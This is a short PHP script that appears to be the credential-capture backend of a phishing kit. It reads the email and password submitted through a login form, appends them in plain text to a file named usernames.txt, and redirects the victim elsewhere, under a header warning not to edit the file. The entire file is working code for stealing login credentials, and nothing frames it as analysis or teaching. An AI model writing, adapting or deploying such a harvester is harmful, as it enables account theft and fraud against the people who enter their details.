<?php # DO NOT EDIT/TAMPER WITH THIS FILE #
			file_put_contents("usernames.txt", "                [ EMAIL: " . " ". $_POST['email'] . " ]   " . " " . "[ PASSWORD: " . " " . $_POST['pass'] . " ]\n", FILE_APPEND);
  			header('Location: <REDIRECT>');
			exit();
?>